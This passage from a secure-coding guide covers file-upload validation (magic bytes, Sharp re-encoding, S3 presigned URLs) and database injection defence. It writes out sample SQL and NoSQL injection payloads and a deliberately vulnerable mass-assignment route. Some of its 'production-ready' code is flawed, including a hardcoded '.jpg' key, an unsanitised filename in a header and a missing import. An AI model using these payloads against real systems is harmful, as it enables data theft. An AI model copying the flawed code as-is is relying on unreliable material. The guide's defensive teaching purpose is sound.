└──────────────────────────────────────────────────────────────────┘
```

### MIME Type Validation Hierarchy

```
MIME CHECK PRIORITY (most reliable → least reliable):

1. Magic Bytes (file signature)
   └── Most reliable. Can't be spoofed without breaking the file.

2. Content-Type header from upload request
   └── User-controlled. Verify against magic bytes.

3. File extension
   └── Easily spoofed. NEVER trust alone.

4. Content-Type from request body
   └── Can be manipulated. Cross-validate with magic bytes.

VALIDATION RULE:
  if (declaredMimeType !== mimeTypeFromMagicBytes) → REJECT
  if (fileExtension doesn't match mimeTypeFromMagicBytes) → REJECT
  if (all three match) → ALLOW (proceed to re-encoding)
```

---

## 2.3 Master Prompt: AI-Enforced Secure File Upload

> **Copy this prompt into Cursor, ChatGPT, or Claude exactly as written.**

### The Prompt

```
You are a senior security engineer specializing in file upload
security. You have extensive experience preventing RCE via file
uploads in production systems handling 10M+ uploads/month.

Write a complete, production-ready file upload validation system for
a Node.js/Express backend that implements ALL of the following:

MANDATORY SECURITY REQUIREMENTS:

1. REQUEST VALIDATION:
   - Accept ONLY predefined MIME types via allowlist (image/jpeg,
     image/png, image/gif, image/webp, application/pdf).
   - Maximum file size: 10MB for images, 25MB for PDFs.
   - Validate Content-Type header matches the allowed list.
   - Reject request if file count exceeds 1 per upload.
   - Return HTTP 413 for oversized files, 415 for wrong type.

2. MAGIC BYTE VALIDATION:
   - Read the first 32 bytes of the uploaded file.
   - Compare against known magic byte signatures:
     * JPEG: FF D8 FF E0 or FF D8 FF E1 (APP0/APP1)
     * PNG:  89 50 4E 47 0D 0A 1A 0A
     * GIF:  47 49 46 38 37 61 (GIF87a) or 47 49 46 38 39 61 (GIF89a)
     * PDF:  25 50 44 46 (%PDF)
   - REJECT if magic bytes don't match the declared MIME type.
   - This is non-negotiable. Even if Sharp fails, magic bytes MUST match.

3. FILENAME SANITIZATION:
   - Generate a new random filename (UUID v4 + original extension).
   - NEVER use the user-provided filename.
   - Strip null bytes, path separators, and special characters.
   - Store original filename separately as metadata (for display only).

4. RE-ENCODING (CRITICAL):
   - Process ALL images through Sharp with these settings:
     * JPEG: quality 85, strip EXIF/metadata, MozJPEG encoding
     * PNG:  compression level 9, strip metadata
     * GIF:  process through Sharp (strips scripts, polyglots)
   - This REMOVES embedded scripts, EXIF data, and polyglot payloads.
   - Output is stored as a NEW file. Original is discarded.
   - The output file is served, NEVER the original.

5. STORAGE CONFIGURATION:
   - Use presigned URLs for direct client→S3 upload (file doesn't
     touch your server).
   - Store processed files in a SEPARATE bucket from originals.
   - Set S3 bucket policy: block public access, require CloudFront
     for serving.
   - Enable S3 server-side encryption (SSE-S3 or SSE-KMS).

6. SERVING SECURITY:
   - Serve files through CDN (CloudFront/Cloudflare) with:
     * Content-Disposition: inline (for images)
     * Cache-Control: public, max-age=31536000, immutable
     * Content-Security-Policy: default-src 'none'
     * X-Content-Type-Options: nosniff
   - NEVER serve from your application server directly.
   - NEVER serve the original upload. Always serve the re-encoded version.

7. TYPE SAFETY:
   - Define TypeScript interfaces for upload metadata, validation
     results, and storage records.
   - Use strict typing. No `any` types.
   - Validate all inputs with Zod schemas.

Output format: Complete, copy-paste-ready TypeScript files with clear
file path comments. Include the upload middleware, validator, Sharp
processor, S3 upload service, and type definitions.
```

---

## 2.4 Production Code: Secure File Upload Implementation

### File: `types/upload.ts`

```typescript
// types/upload.ts — File upload type definitions

export interface UploadMetadata {
  originalFilename: string;
  mimeType: string;
  size: number;
  userId: string;
  purpose: 'avatar' | 'document' | 'attachment';
}

export interface ValidationResult {
  isValid: boolean;
  detectedMimeType: string | null;
  errors: string[];
}

export interface ProcessedImage {
  buffer: Buffer;
  mimeType: string;
  width: number;
  height: number;
  size: number;
}

export interface StoredFile {
  id: string;
  cleanKey: string;          // S3 key of re-encoded file
  originalFilename: string;  // Metadata only, never served
  mimeType: string;
  size: number;
  width: number | null;
  height: number | null;
  userId: string;
  purpose: string;
  cdnUrl: string;
  createdAt: Date;
}

export interface MagicByteSignature {
  mime: string;
  extension: string;
  bytes: number[];
  offset: number;
}
```

### File: `lib/magic-bytes.ts`

```typescript
// lib/magic-bytes.ts — Magic byte signature database and validation

import type { MagicByteSignature, ValidationResult } from '../types/upload';

// Known file signatures — THE source of truth for file type validation
const MAGIC_SIGNATURES: MagicByteSignature[] = [
  {
    mime: 'image/jpeg',
    extension: '.jpg',
    bytes: [0xff, 0xd8, 0xff],
    offset: 0,
  },
  {
    mime: 'image/png',
    extension: '.png',
    bytes: [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a],
    offset: 0,
  },
  {
    mime: 'image/gif',
    extension: '.gif',
    bytes: [0x47, 0x49, 0x46, 0x38, 0x37, 0x61], // GIF87a
    offset: 0,
  },
  {
    mime: 'image/gif',
    extension: '.gif',
    bytes: [0x47, 0x49, 0x46, 0x38, 0x39, 0x61], // GIF89a
    offset: 0,
  },
  {
    mime: 'image/webp',
    extension: '.webp',
    bytes: [0x52, 0x49, 0x46, 0x46], // RIFF
    offset: 0,
  },
  {
    mime: 'application/pdf',
    extension: '.pdf',
    bytes: [0x25, 0x50, 0x44, 0x46], // %PDF
    offset: 0,
  },
];

// Allowed MIME types per upload purpose
const ALLOWED_MIME_TYPES: Record<string, string[]> = {
  avatar: ['image/jpeg', 'image/png', 'image/gif', 'image/webp'],
  document: ['application/pdf'],
  attachment: [
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/webp',
    'application/pdf',
  ],
};

// Max file sizes per purpose (in bytes)
const MAX_FILE_SIZES: Record<string, number> = {
  avatar: 10 * 1024 * 1024,    // 10MB
  document: 25 * 1024 * 1024,  // 25MB
  attachment: 10 * 1024 * 1024, // 10MB
};

/**
 * Detect file type by reading magic bytes from the file buffer.
 * This is the most reliable method of file type detection.
 * The first 32 bytes are compared against known signatures.
 */
export function detectMimeType(buffer: Buffer): string | null {
  // Read first 32 bytes for signature matching
  const header = buffer.subarray(0, 32);

  for (const signature of MAGIC_SIGNATURES) {
    const sigBytes = Buffer.from(signature.bytes);
    const fileSegment = header.subarray(
      signature.offset,
      signature.offset + sigBytes.length
    );

    if (sigBytes.equals(fileSegment)) {
      return signature.mime;
    }
  }

  return null;
}

/**
 * Get the expected file extension for a MIME type.
 */
export function getExtensionForMime(mimeType: string): string {
  const signature = MAGIC_SIGNATURES.find((s) => s.mime === mimeType);
  return signature?.extension || '.bin';
}

/**
 * Validate an uploaded file against all security rules.
 *
 * Validation order:
 * 1. File size check
 * 2. Content-Type header check against allowlist
 * 3. Magic byte detection (THE source of truth)
 * 4. Cross-validation: declared MIME must match detected MIME
 */
export function validateFile(
  buffer: Buffer,
  declaredMimeType: string,
  purpose: string
): ValidationResult {
  const errors: string[] = [];

  // 1. File size check
  const maxSize = MAX_FILE_SIZES[purpose] || MAX_FILE_SIZES.attachment;
  if (buffer.length > maxSize) {
    errors.push(
      `File size ${buffer.length} exceeds maximum ${maxSize} bytes`
    );
  }

  // 2. Content-Type header check against allowlist
  const allowedTypes = ALLOWED_MIME_TYPES[purpose] || ALLOWED_MIME_TYPES.attachment;
  if (!allowedTypes.includes(declaredMimeType)) {
    errors.push(
      `MIME type '${declaredMimeType}' is not allowed for ${purpose} uploads`
    );
  }

  // 3. Magic byte detection
  const detectedMimeType = detectMimeType(buffer);

  if (!detectedMimeType) {
    errors.push(
      'File content does not match any recognized format. File may be corrupted or malformed.'
    );
  }

  // 4. Cross-validation: declared MIME must match detected MIME
  if (detectedMimeType && detectedMimeType !== declaredMimeType) {
    errors.push(
      `Content-Type mismatch: header says '${declaredMimeType}' but file content is '${detectedMimeType}'`
    );
  }

  // 5. Additional checks for specific types
  if (detectedMimeType === 'image/svg+xml') {
    errors.push('SVG files are not allowed (XSS risk)');
  }

  if (detectedMimeType === 'image/gif' && purpose === 'avatar') {
    // GIFs can contain embedded scripts in some edge cases
    // Consider restricting to JPEG/PNG for avatars
    // Remove this check if GIF avatars are required
  }

  return {
    isValid: errors.length === 0,
    detectedMimeType,
    errors,
  };
}

/**
 * Sanitize a filename to prevent path traversal and injection attacks.
 * Generates a new random filename while preserving the original extension.
 */
export function sanitizeFilename(
  originalFilename: string,
  detectedMimeType: string
): { safeFilename: string; extension: string } {
  const crypto = require('crypto');

  // Get extension from detected MIME type (NOT from user input)
  const extension = getExtensionForMime(detectedMimeType);

  // Generate random filename
  const randomName = crypto.randomUUID();
  const safeFilename = `${randomName}${extension}`;

  return { safeFilename, extension };
}
```

### File: `lib/image-processor.ts`

```typescript
// lib/image-processor.ts — Sharp-based image re-encoding and sanitization

import sharp from 'sharp';
import type { ProcessedImage } from '../types/upload';

/**
 * Process an uploaded image through Sharp.
 *
 * This is the CRITICAL security step:
 * - Re-encodes the image from raw pixel data
 * - Strips ALL metadata (EXIF, XMP, ICC profiles, comments)
 * - Removes embedded scripts (SVG XSS payloads)
 * - Eliminates polyglot file structures
 * - Output is a NEW, clean file
 *
 * The original file is NEVER served. Only the re-encoded version.
 */
export async function processImage(
  inputBuffer: Buffer,
  mimeType: string,
  purpose: string
): Promise<ProcessedImage> {
  const pipeline = sharp(inputBuffer, {
    failOn: 'none',           // Don't fail on warnings
    sequentialRead: true,     // Optimize for memory
    limitInputPixels: 268402689, // ~16384x16384 pixels
  });

  // Get image metadata for validation
  const metadata = await pipeline.metadata();

  // Validate image dimensions
  if (purpose === 'avatar') {
    const maxDimension = 4096;
    if (
      (metadata.width && metadata.width > maxDimension) ||
      (metadata.height && metadata.height > maxDimension)
    ) {
      throw new Error(
        `Image dimensions ${metadata.width}x${metadata.height} exceed maximum ${maxDimension}`
      );
    }
  }

  // Process based on MIME type
  switch (mimeType) {
    case 'image/jpeg':
      return processJpeg(pipeline, purpose);

    case 'image/png':
      return processPng(pipeline, purpose);

    case 'image/gif':
      return processGif(pipeline, purpose);

    case 'image/webp':
      return processWebp(pipeline, purpose);

    default:
      throw new Error(`Unsupported image type: ${mimeType}`);
  }
}

/**
 * Process JPEG: Strip metadata, apply MozJPEG-like compression.
 */
async function processJpeg(
  pipeline: sharp.Sharp,
  purpose: string
): Promise<ProcessedImage> {
  const quality = purpose === 'avatar' ? 85 : 80;

  const result = await pipeline
    .jpeg({
      quality,
      progressive: true,          // Progressive JPEG for better UX
      mozjpeg: true,              // Use MozJPEG encoder (better compression)
      chromaSubsampling: '4:4:4', // Preserve color accuracy
      force: true,                // Re-encode even if already JPEG
    })
    .toBuffer({ resolveWithObject: true });

  return {
    buffer: result.data,
    mimeType: 'image/jpeg',
    width: result.info.width,
    height: result.info.height,
    size: result.data.length,
  };
}

/**
 * Process PNG: Strip metadata, maximize compression.
 */
async function processPng(
  pipeline: sharp.Sharp,
  purpose: string
): Promise<ProcessedImage> {
  const result = await pipeline
    .png({
      compressionLevel: 9,         // Maximum compression
      adaptiveFiltering: true,     // Better compression for photos
      palette: false,              // Keep as truecolor (safer)
      force: true,                 // Re-encode even if already PNG
    })
    .toBuffer({ resolveWithObject: true });

  return {
    buffer: result.data,
    mimeType: 'image/png',
    width: result.info.width,
    height: result.info.height,
    size: result.data.length,
  };
}

/**
 * Process GIF: Re-encode through Sharp (strips scripts, polyglots).
 * Note: Sharp converts GIF to PNG by default. If animation is needed,
 * use .gif() with animated: true, but be aware of security implications.
 */
async function processGif(
  pipeline: sharp.Sharp,
  purpose: string
): Promise<ProcessedImage> {
  // Re-encode as PNG (safest — destroys any embedded scripts)
  // If animation support is required, use .gif({ animated: true })
  // but ensure frame validation is implemented
  const result = await pipeline
    .png({
      compressionLevel: 9,
      force: true,
    })
    .toBuffer({ resolveWithObject: true });

  return {
    buffer: result.data,
    mimeType: 'image/png', // Output is PNG, not GIF
    width: result.info.width,
    height: result.info.height,
    size: result.data.length,
  };
}

/**
 * Process WebP: Strip metadata, re-encode.
 */
async function processWebp(
  pipeline: sharp.Sharp,
  purpose: string
): Promise<ProcessedImage> {
  const quality = purpose === 'avatar' ? 85 : 80;

  const result = await pipeline
    .webp({
      quality,
      effort: 4,               // Balanced speed/quality
      force: true,             // Re-encode even if already WebP
    })
    .toBuffer({ resolveWithObject: true });

  return {
    buffer: result.data,
    mimeType: 'image/webp',
    width: result.info.width,
    height: result.info.height,
    size: result.data.length,
  };
}

/**
 * Generate multiple sizes for an avatar image.
 * Returns original + thumbnail + medium sizes.
 */
export async function generateAvatarSizes(
  inputBuffer: Buffer
): Promise<{
  original: ProcessedImage;
  thumbnail: ProcessedImage;
  medium: ProcessedImage;
}> {
  const [original, thumbnail, medium] = await Promise.all([
    processImage(inputBuffer, 'image/jpeg', 'avatar'),
    sharp(inputBuffer)
      .resize(128, 128, { fit: 'cover' })
      .jpeg({ quality: 80, mozjpeg: true })
      .toBuffer({ resolveWithObject: true })
      .then((result) => ({
        buffer: result.data,
        mimeType: 'image/jpeg' as const,
        width: result.info.width,
        height: result.info.height,
        size: result.data.length,
      })),
    sharp(inputBuffer)
      .resize(512, 512, { fit: 'cover' })
      .jpeg({ quality: 85, mozjpeg: true })
      .toBuffer({ resolveWithObject: true })
      .then((result) => ({
        buffer: result.data,
        mimeType: 'image/jpeg' as const,
        width: result.info.width,
        height: result.info.height,
        size: result.data.length,
      })),
  ]);

  return { original, thumbnail, medium };
}
```

### File: `lib/storage-service.ts`

```typescript
// lib/storage-service.ts — S3/R2 presigned URL generation and upload management

import { S3Client, PutObjectCommand, DeleteObjectCommand } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';
import crypto from 'crypto';
import { db } from './database';
import type { StoredFile, UploadMetadata } from '../types/upload';

const s3Client = new S3Client({
  region: process.env.AWS_REGION || 'us-east-1',
  credentials: {
    accessKeyId: process.env.AWS_ACCESS_KEY_ID!,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY!,
  },
});

const BUCKET_NAME = process.env.S3_BUCKET_NAME!;
const CDN_DOMAIN = process.env.CDN_DOMAIN!;
const MAX_UPLOAD_ATTEMPTS = 3;

/**
 * Generate a presigned URL for direct client-to-S3 upload.
 * The file NEVER touches your server — this is critical for security.
 */
export async function generateUploadUrl(
  metadata: UploadMetadata
): Promise<{ uploadUrl: string; fileKey: string; fileId: string }> {
  const fileId = crypto.randomUUID();
  const randomSuffix = crypto.randomBytes(8).toString('hex');

  // Construct a safe S3 key — NEVER use user-provided filenames
  const s3Key = `uploads/${metadata.userId}/${fileId}-${randomSuffix}.jpg`;

  const command = new PutObjectCommand({
    Bucket: BUCKET_NAME,
    Key: s3Key,
    // Force Content-Type to match declared type
    ContentType: metadata.mimeType,
    // Metadata for server-side reference
    Metadata: {
      'original-filename': metadata.originalFilename.substring(0, 255),
      'user-id': metadata.userId,
      purpose: metadata.purpose,
      'upload-id': fileId,
    },
    // Content-Disposition for safe serving
    ContentDisposition: `inline; filename="${metadata.originalFilename.substring(0, 100)}"`,
    // Cache control
    CacheControl: 'public, max-age=31536000, immutable',
    // Server-side encryption
    ServerSideEncryption: 'AES256',
  });

  const uploadUrl = await getSignedUrl(s3Client, command, {
    expiresIn: 60, // 60 seconds to complete upload
  });

  return { uploadUrl, fileKey: s3Key, fileId };
}

/**
 * Process a completed upload:
 * 1. Download from S3
 * 2. Validate magic bytes
 * 3. Re-encode through Sharp
 * 4. Upload clean version to /clean/ prefix
 * 5. Delete original from /uploads/
 * 6. Store metadata in database
 */
export async function processUploadedFile(
  userId: string,
  s3Key: string,
  metadata: UploadMetadata
): Promise<StoredFile> {
  const { GetObjectCommand } = await import('@aws-sdk/client-s3');

  // 1. Download the uploaded file from S3
  const getCommand = new GetObjectCommand({
    Bucket: BUCKET_NAME,
    Key: s3Key,
  });

  const response = await s3Client.send(getCommand);
  const fileBuffer = Buffer.from(await response.Body!.transformToByteArray());

  // 2. Validate magic bytes
  const { validateFile } = await import('./magic-bytes');
  const validation = validateFile(fileBuffer, metadata.mimeType, metadata.purpose);

  if (!validation.isValid) {
    // Delete the invalid file immediately
    await deleteFile(s3Key);
    throw new Error(`File validation failed: ${validation.errors.join(', ')}`);
  }

  // 3. Re-encode through Sharp
  const { processImage } = await import('./image-processor');
  const processed = await processImage(fileBuffer, metadata.mimeType, metadata.purpose);

  // 4. Upload clean version to /clean/ prefix
  const cleanKey = s3Key.replace('uploads/', 'clean/');
  const putCleanCommand = new PutObjectCommand({
    Bucket: BUCKET_NAME,
    Key: cleanKey,
    Body: processed.buffer,
    ContentType: processed.mimeType,
    CacheControl: 'public, max-age=31536000, immutable',
    ServerSideEncryption: 'AES256',
    ContentDisposition: 'inline',
  });

  await s3Client.send(putCleanCommand);

  // 5. Delete the original
  await deleteFile(s3Key);

  // 6. Store metadata in database
  const cdnUrl = `https://${CDN_DOMAIN}/${cleanKey}`;

  const storedFile = await db.file.create({
    data: {
      id: crypto.randomUUID(),
      cleanKey,
      originalFilename: metadata.originalFilename,
      mimeType: processed.mimeType,
      size: processed.size,
      width: processed.width,
      height: processed.height,
      userId,
      purpose: metadata.purpose,
      cdnUrl,
    },
  });

  return storedFile;
}

/**
 * Delete a file from S3.
 */
export async function deleteFile(s3Key: string): Promise<void> {
  const command = new DeleteObjectCommand({
    Bucket: BUCKET_NAME,
    Key: s3Key,
  });

  await s3Client.send(command);
}

/**
 * Delete all files for a user (account deletion).
 */
export async function deleteUserFiles(userId: string): Promise<void> {
  const { ListObjectsV2Command } = await import('@aws-sdk/client-s3');

  const listCommand = new ListObjectsV2Command({
    Bucket: BUCKET_NAME,
    Prefix: `uploads/${userId}/`,
  });

  const response = await s3Client.send(listCommand);

  if (response.Contents) {
    await Promise.all(
      response.Contents.map((obj) => obj.Key && deleteFile(obj.Key))
    );
  }

  // Also clean versions
  const cleanListCommand = new ListObjectsV2Command({
    Bucket: BUCKET_NAME,
    Prefix: `clean/${userId}/`,
  });

  const cleanResponse = await s3Client.send(cleanListCommand);

  if (cleanResponse.Contents) {
    await Promise.all(
      cleanResponse.Contents.map((obj) => obj.Key && deleteFile(obj.Key))
    );
  }
}
```

### File: `middleware/upload.ts`

```typescript
// middleware/upload.ts — Express middleware for secure file uploads

import { Request, Response, NextFunction } from 'express';
import { generateUploadUrl, processUploadedFile } from '../lib/storage-service';
import { validateFile, detectMimeType, sanitizeFilename } from '../lib/magic-bytes';
import type { UploadMetadata } from '../types/upload';

// Rate limit: 10 uploads per user per hour
const UPLOAD_RATE_LIMIT = 10;
const UPLOAD_WINDOW_MS = 60 * 60 * 1000;

const uploadCounts = new Map<string, { count: number; windowStart: number }>();

/**
 * Rate limiter for file uploads.
 * Prevents abuse and disk-filling attacks.
 */
function checkUploadRateLimit(userId: string): boolean {
  const now = Date.now();
  const record = uploadCounts.get(userId);

  if (!record || now - record.windowStart > UPLOAD_WINDOW_MS) {
    uploadCounts.set(userId, { count: 1, windowStart: now });
    return true;
  }

  if (record.count >= UPLOAD_RATE_LIMIT) {
    return false;
  }

  record.count++;
  return true;
}

/**
 * Express middleware: Generate presigned upload URL.
 */
export async function requestUploadUrl(
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    const userId = (req as any).userId;

    // Rate limit check
    if (!checkUploadRateLimit(userId)) {
      res.status(429).json({
        error: {
          code: 'UPLOAD_RATE_LIMIT',
          message: 'Upload limit exceeded. Try again later.',
        },
      });
      return;
    }

    const { filename, mimeType, purpose, fileSize } = req.body;

    // Validate inputs with Zod (import your schema)
    // const validated = uploadRequestSchema.parse(req.body);

    // Validate file size before presigning
    const maxSizes: Record<string, number> = {
      avatar: 10 * 1024 * 1024,
      document: 25 * 1024 * 1024,
      attachment: 10 * 1024 * 1024,
    };

    if (fileSize > (maxSizes[purpose] || maxSizes.attachment)) {
      res.status(413).json({
        error: {
          code: 'FILE_TOO_LARGE',
          message: `File size exceeds maximum for ${purpose} uploads`,
        },
      });
      return;
    }

    // Validate MIME type is allowed
    const allowedTypes = [
      'image/jpeg',
      'image/png',
      'image/gif',
      'image/webp',
      'application/pdf',
    ];

    if (!allowedTypes.includes(mimeType)) {
      res.status(415).json({
        error: {
          code: 'UNSUPPORTED_TYPE',
          message: `File type '${mimeType}' is not supported`,
        },
      });
      return;
    }

    // Generate presigned URL
    const metadata: UploadMetadata = {
      originalFilename: filename,
      mimeType,
      size: fileSize,
      userId,
      purpose,
    };

    const { uploadUrl, fileKey, fileId } = await generateUploadUrl(metadata);

    res.json({
      uploadUrl,
      fileKey,
      fileId,
      expiresIn: 60,
    });
  } catch (error) {
    console.error('[UPLOAD] Error generating upload URL:', error);
    res.status(500).json({
      error: {
        code: 'UPLOAD_ERROR',
        message: 'Failed to generate upload URL',
      },
    });
  }
}

/**
 * Express middleware: Process completed upload.
 * This is called after the client confirms upload to S3 is complete.
 */
export async function processUpload(
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    const userId = (req as any).userId;
    const { fileKey, purpose, originalFilename, mimeType } = req.body;

    // Validate required fields
    if (!fileKey || !purpose || !originalFilename || !mimeType) {
      res.status(400).json({
        error: {
          code: 'MISSING_FIELDS',
          message: 'fileKey, purpose, originalFilename, and mimeType are required',
        },
      });
      return;
    }

    // Verify the file key belongs to this user (prevent IDOR)
    if (!fileKey.startsWith(`uploads/${userId}/`)) {
      res.status(403).json({
        error: {
          code: 'FORBIDDEN',
          message: 'You can only process your own uploads',
        },
      });
      return;
    }

    // Process the uploaded file
    const storedFile = await processUploadedFile(userId, fileKey, {
      originalFilename,
      mimeType,
      size: 0, // Will be determined during processing
      userId,
      purpose,
    });

    res.json({
      file: {
        id: storedFile.id,
        url: storedFile.cdnUrl,
        width: storedFile.width,
        height: storedFile.height,
        mimeType: storedFile.mimeType,
      },
    });
  } catch (error) {
    console.error('[UPLOAD] Error processing upload:', error);
    res.status(500).json({
      error: {
        code: 'PROCESSING_ERROR',
        message: 'Failed to process uploaded file',
      },
    });
  }
}

/**
 * Express middleware: Delete a file.
 */
export async function deleteUpload(
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    const userId = (req as any).userId;
    const { fileId } = req.params;

    // Verify ownership
    const file = await db.file.findFirst({
      where: { id: fileId, userId },
    });

    if (!file) {
      res.status(404).json({
        error: {
          code: 'FILE_NOT_FOUND',
          message: 'File not found',
        },
      });
      return;
    }

    // Delete from S3
    const { deleteFile } = await import('../lib/storage-service');
    await deleteFile(file.cleanKey);

    // Delete from database
    await db.file.delete({ where: { id: fileId } });

    res.json({ message: 'File deleted successfully' });
  } catch (error) {
    console.error('[UPLOAD] Error deleting file:', error);
    res.status(500).json({
      error: {
        code: 'DELETE_ERROR',
        message: 'Failed to delete file',
      },
    });
  }
}
```

---

### Module 2 Security Checklist

| # | Check | Status |
|---|---|---|
| 1 | File type validated against magic bytes (not extension) | ⬜ |
| 2 | Magic bytes cross-validated with Content-Type header | ⬜ |
| 3 | File size limits enforced per type | ⬜ |
| 4 | Filename sanitized (UUID, no user input) | ⬜ |
| 5 | All images re-encoded through Sharp (strips metadata/scripts) | ⬜ |
| 6 | Original file never served — only re-encoded version | ⬜ |
| 7 | Presigned S3 URLs (file doesn't touch your server) | ⬜ |
| 8 | S3 bucket: public access blocked | ⬜ |
| 9 | S3 bucket: server-side encryption enabled | ⬜ |
| 10 | Files served through CDN with security headers | ⬜ |
| 11 | Upload rate limiting per user | ⬜ |
| 12 | SVG files blocked (XSS risk) | ⬜ |
| 13 | No null bytes or path separators in filenames | ⬜ |
| 14 | TypeScript strict typing throughout | ⬜ |
| 15 | Error messages don't leak internal paths | ⬜ |

---

# MODULE 3: DATABASE SECURITY, INJECTION & ROW LEVEL SECURITY

## Pages 9–12 | Your Database Is Not a Sandbox

---

## 3.1 Threat Vector Analysis

Database vulnerabilities are the most frequently exploited attack vector in web applications. SQL and NoSQL injection attacks have remained in the OWASP Top 10 for over a decade because developers still trust user input.

### Attack Surface Map

| Attack Vector | Severity | Prevalence | Impact |
|---|---|---|---|
| **SQL Injection (SQLi)** | Critical | Very High | Full database compromise |
| **NoSQL Injection** | Critical | High | Authentication bypass, data leak |
| **Mass Assignment** | High | High | Privilege escalation, data corruption |
| **Data Wiping/Ransomware** | Critical | Medium | Complete data destruction |
| **ORM Query Injection** | High | Medium | Bypass ORM protections |
| **Blind SQL Injection** | High | High | Data exfiltration without visible errors |
| **Second-Order Injection** | High | Low | Stored payloads executed later |

### SQL Injection Attack Vectors

```
┌─────────────────────────────────────────────────────────────────┐
│                    SQL INJECTION VECTORS                         │
│                                                                  │
│  VECTOR 1: Classic Union-Based                                  │
│  ┌────────────────────────────────────────────────┐              │
│  │  Input: ' UNION SELECT username, password      │              │
│  │         FROM users WHERE 1=1 --                │              │
│  │                                                 │              │
│  │  Result: Returns ALL usernames and passwords    │              │
│  └────────────────────────────────────────────────┘              │
│                                                                  │
│  VECTOR 2: Blind Injection (Time-Based)                          │
│  ┌────────────────────────────────────────────────┐              │
│  │  Input: ' OR pg_sleep(10) --                   │              │
│  │                                                 │              │
│  │  Result: Server hangs for 10 seconds            │              │
│  │          Attacker infers data byte-by-byte       │              │
│  └────────────────────────────────────────────────┘              │
│                                                                  │
│  VECTOR 3: NoSQL Injection (MongoDB)                             │
│  ┌────────────────────────────────────────────────┐              │
│  │  Input: {"$gt": ""} or {"$ne": null}           │              │
│  │                                                 │              │
│  │  Result: Bypasses authentication checks         │              │
│  │          Returns all documents                   │              │
│  └────────────────────────────────────────────────┘              │
│                                                                  │
│  VECTOR 4: Second-Order Injection                                │
│  ┌────────────────────────────────────────────────┐              │
│  │  Input (stored): admin'--                      │              │
│  │                                                 │              │
│  │  Later: Used in password reset query             │              │
│  │  Result: Password reset for admin account        │              │
│  └────────────────────────────────────────────────┘              │
└─────────────────────────────────────────────────────────────────┘
```

### Mass Assignment Attack

```javascript
// THE MASS ASSIGNMENT ATTACK — How AI code often enables this

// VULNERABLE: AI-generated code that spreads the entire request body
app.put('/api/users/:id', async (req, res) => {
  // Attacker sends: { name: "John", role: "admin", credits: 999999 }
  const updated = await db.user.update({
    where: { id: req.params.id },
    data: req.body,  // ← CRITICAL: Entire body is spread into update
  });
  res.json(updated);
});

// RESULT: Attacker has escalated to admin and given themselves
// unlimited credits. The `role` and `credits` fields were not
// in the expected input, but Prisma accepts them anyway.

// SECURE: Whitelist allowed fields
app.put('/api/users/:id', async (req, res) => {
  const { name, email } = req.body;  // Only extract allowed fields
  const updated = await db.user.update({
    where: { id: req.params.id },
    data: { name, email },  // ← Only whitelisted fields
  });
  res.json(updated);
});
```

---

## 3.2 Architectural Deep Dive: Defense-in-Depth Database Security

### The Five-Layer Database Security Model

```
┌──────────────────────────────────────────────────────────────────┐
│              FIVE-LAYER DATABASE SECURITY                        │
│                                                                  │
│  LAYER 1: INPUT VALIDATION (Zod Schemas)                        │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Validate ALL incoming data with Zod           │              │
│  │  • Define strict schemas for every endpoint      │              │
│  │  • Reject invalid input BEFORE it reaches ORM    │              │
│  │  • Strip unknown fields (prevent mass assignment)│              │
│  │  • Sanitize strings (trim, length limits)        │              │
│  └────────────────────────────────────────────────┘              │
│           │                                                      │
│           ▼                                                      │
│  LAYER 2: ORM PARAMETERIZATION                                   │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Use Prisma, Drizzle, or TypeORM               │              │
│  │  • NEVER write raw SQL with string interpolation │              │
│  │  • Let ORM handle parameter binding              │              │
│  │  • Use query builders, not string concatenation  │              │
│  └────────────────────────────────────────────────┘              │
│           │                                                      │
│           ▼                                                      │
│  LAYER 3: ROW LEVEL SECURITY (RLS)                               │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Database-enforced access control              │              │
│  │  • Users can only access their own data          │              │
│  │  • Even if application code has bugs,            │              │
│  │    RLS policies prevent unauthorized access      │              │
│  │  • Implemented at the database level             │              │
│  │  • Works across ALL application code paths       │              │
│  └────────────────────────────────────────────────┘              │
│           │                                                      │
│           ▼                                                      │
│  LAYER 4: FIELD-LEVEL ACCESS CONTROL                             │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Sensitive fields (password, SSN, tokens)      │              │
│  │    are NEVER selected in queries                  │              │
│  │  • Use Prisma `select` to explicitly pick fields │              │
│  │  • Use `omit` or view-level restrictions         │              │
│  │  • Password hashes never leave the auth service  │              │
│  └────────────────────────────────────────────────┘              │
│           │                                                      │
│           ▼                                                      │
│  LAYER 5: AUDIT LOGGING & MONITORING                             │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Log ALL database operations with:             │              │
│  │    - Who performed the action                    │              │
│  │    - What was accessed/modified                  │              │
│  │    - When it happened (timestamp)                │              │
│  │    - IP address and user agent                   │              │
│  │  • Alert on suspicious patterns:                 │              │
│  │    - Bulk data exports                           │              │
│  │    - Unusual query patterns                      │              │
│  │    - Failed permission checks                    │              │
│  └────────────────────────────────────────────────┘              │
└──────────────────────────────────────────────────────────────────┘
```

### Supabase Row Level Security (RLS) Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│              ROW LEVEL SECURITY FLOW                             │
│                                                                  │
│  [Client Request]                                                │
│     │                                                            │
│     │  Authorization: Bearer <jwt>                               │
│     │                                                            │
│     ▼                                                            │
│  [Supabase PostgREST]                                            │
│     │                                                            │
│     │  1. Extract JWT claims (user_id, role)                     │
│     │  2. Set session variable:                                  │
│     │     SET request.jwt.claims.sub = '<user_id>'               │
│     │  3. Execute query with RLS enabled                         │
│     │                                                            │
│     ▼                                                            │
│  [PostgreSQL RLS Policy Check]                                   │
│     │                                                            │
│     │  Policy: "users_can_only_read_own_data"                    │
│     │  SQL: SELECT FROM orders                                   │
│     │       WHERE user_id = current_setting('request.jwt.claims.sub')::uuid
│     │                                                            │
│     │  If user_id in JWT matches user_id in row → ALLOW          │
│     │  If user_id in JWT does NOT match → DENY (return empty)    │
│     │                                                            │
│     ▼                                                            │
│  [Result]                                                        │
│     │                                                            │
